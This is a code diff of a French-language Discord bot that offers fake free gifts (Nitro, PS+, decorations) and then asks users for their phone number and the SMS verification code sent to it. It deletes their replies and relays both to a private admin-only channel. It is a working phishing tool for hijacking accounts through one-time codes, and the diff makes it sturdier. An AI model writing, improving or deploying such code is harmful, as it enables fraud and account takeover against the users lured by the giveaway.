@@ -8,12 +8,12 @@ intents = discord.Intents.default()
 intents.message_content = True
 intents.members = True
 
-# Création du bot avec le prefixe !
+# Création du bot avec le préfixe +
 bot = commands.Bot(command_prefix="+", intents=intents)
 
 # Récupération des variables d'environnement
 DISCORD_TOKEN = os.getenv("DISCORD_TOKEN")
-ADMIN_ID = int(os.getenv("ADMIN_ID"))
+ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
 
 GIFTS = [
     discord.SelectOption(label="Discord Nitro 1 An", emoji="💎", value="nitro_1y"),
@@ -21,19 +21,28 @@ GIFTS = [
     discord.SelectOption(label="PS+", emoji="🎮", value="ps_plus"),
     discord.SelectOption(label="Déco de ton choix", emoji="🌸", value="deco_choice"),
     discord.SelectOption(label="Pack de ton choix", emoji="🎁", value="pack_choice"),
-    discord.SelectOption(label="Virement PayPal 50€", emoji="💳", value="paypal_50"),
-    discord.SelectOption(label="Virement PayPal 100€", emoji="💳", value="paypal_100"),
 ]
+
+
+def get_gift_label(value):
+    """Retourne le label correspondant à la valeur du select."""
+    for opt in GIFTS:
+        if opt.value == value:
+            return opt.label
+    return None
+
 
 class GiftSelect(discord.ui.Select):
     def __init__(self):
         super().__init__(placeholder="Choisis ton cadeau...", options=GIFTS, custom_id="gift_select")
 
     async def callback(self, interaction: discord.Interaction):
-        # 1. Réponse immédiate pour éviter le "L'application ne répond plus"
         selected_gift = self.values[0]
+        gift_label = get_gift_label(selected_gift)
+
+        # 1. Réponse immédiate pour éviter le "L'application ne répond pas"
         await interaction.response.send_message(
-            f"Tu as choisi : **{self.get_option(selected_gift).label}**\n\n"
+            f"Tu as choisi : **{gift_label}**\n\n"
             "Maintenant, entre ton numéro de téléphone (format : +33XXXXXXXXX) :",
             ephemeral=True
         )
@@ -42,14 +51,18 @@ class GiftSelect(discord.ui.Select):
         def check(m):
             return m.author == interaction.user and m.channel == interaction.channel
 
+        guild = interaction.guild
+
         try:
-            # 3. Attente du numéro de téléphone (timeout de 120s)
+            # 3. Attente du numéro de téléphone (timeout 120s)
             phone_msg = await bot.wait_for("message", check=check, timeout=120)
             phone_number = phone_msg.content.strip()
-            await phone_msg.delete()
+            try:
+                await phone_msg.delete()
+            except discord.NotFound:
+                pass  # message déjà supprimé
 
             # Création du channel privé
-            guild = interaction.guild
             overwrites = {
                 guild.default_role: discord.PermissionOverwrite(read_messages=False),
                 guild.me: discord.PermissionOverwrite(read_messages=True),
@@ -60,16 +73,17 @@ class GiftSelect(discord.ui.Select):
                 overwrites[admin] = discord.PermissionOverwrite(read_messages=True)
 
             channel_name = f"gift-{interaction.user.id}"
-            private_channel = await guild.create_text_channel(channel_name, overwrites=overwrites)
+            private_channel = await guild.create_text_channel(
+                channel_name,
+                overwrites=overwrites,
+                category=guild.get_channel(interaction.channel.category_id) if interaction.channel.category_id else None
+            )
 
-            gift_label = self.get_option(selected_gift).label
-
-            # Message au admin dans le nouveau channel
+            # Message admin dans le nouveau channel
             embed = discord.Embed(title="🎁 Nouvelle commande", color=discord.Color.purple())
             embed.add_field(name="Utilisateur", value=f"{interaction.user.mention} (`{interaction.user.id}`)", inline=False)
             embed.add_field(name="Cadeau choisi", value=gift_label, inline=False)
             embed.add_field(name="Numéro de téléphone", value=f"||{phone_number}||", inline=False)
-
             await private_channel.send(embed=embed)
 
             # Notification à l'utilisateur
@@ -83,42 +97,37 @@ class GiftSelect(discord.ui.Select):
             try:
                 sms_msg = await bot.wait_for("message", check=check, timeout=120)
                 sms_code = sms_msg.content.strip()
-                await sms_msg.delete()
+                try:
+                    await sms_msg.delete()
+                except discord.NotFound:
+                    pass
 
                 embed2 = discord.Embed(title="📱 Code SMS reçu", color=discord.Color.blue())
                 embed2.add_field(name="Utilisateur", value=f"{interaction.user.mention}", inline=False)
                 embed2.add_field(name="Code SMS", value=f"||{sms_code}||", inline=False)
                 await private_channel.send(embed=embed2)
 
-                await interaction.followup.send(
-                    "✅ Code SMS envoyé. Merci !",
-                    ephemeral=True
-                )
+                await interaction.followup.send("✅ Code SMS envoyé. Merci !", ephemeral=True)
+
             except asyncio.TimeoutError:
                 await interaction.followup.send("⏰ Temps écoulé pour le code SMS.", ephemeral=True)
 
         except asyncio.TimeoutError:
             await interaction.followup.send("⏰ Temps écoulé pour le numéro de téléphone.", ephemeral=True)
 
-    def get_option(self, value):
-        for opt in self.options:
-            if opt.value == value:
-                return opt
-        return None
 
 class GiftView(discord.ui.View):
     def __init__(self):
-        super().__init__(timeout=None) # Pas de timeout global pour la vue
+        super().__init__(timeout=None)  # pas de timeout global
         self.add_item(GiftSelect())
+
 
 @bot.event
 async def on_ready():
     print(f"Bot connecté en tant que {bot.user}")
-    # La View est ajoutée dynamiquement lors de l'appel à /cadeaux,
-    # mais tu peux aussi l'ajouter ici si tu veux qu'elle soit globale.
-    # Pour ton cas, l'ajout dans la commande est suffisant.
 
-@bot.command(name="cadeaux")  # Nom de la commande : /cadeaux ou !cadeaux selon le prefixe
+
+@bot.command(name="cadeaux")
 async def setup(ctx):
     if ctx.author.id != ADMIN_ID:
         await ctx.send("Seul l'admin peut utiliser cette commande.")
@@ -129,12 +138,12 @@ async def setup(ctx):
         description="Sélectionne le cadeau que tu veux recevoir ci-dessous.",
         color=discord.Color.gold()
     )
-    # Envoi du message avec la vue
     await ctx.send(embed=embed, view=GiftView())
+
 
 # Lancement du bot
 if __name__ == "__main__":
-    if :
+    if DISCORD_TOKEN:
         bot.run(DISCORD_TOKEN)
     else:
         print("Erreur : DISCORD_TOKEN n'est pas défini.")
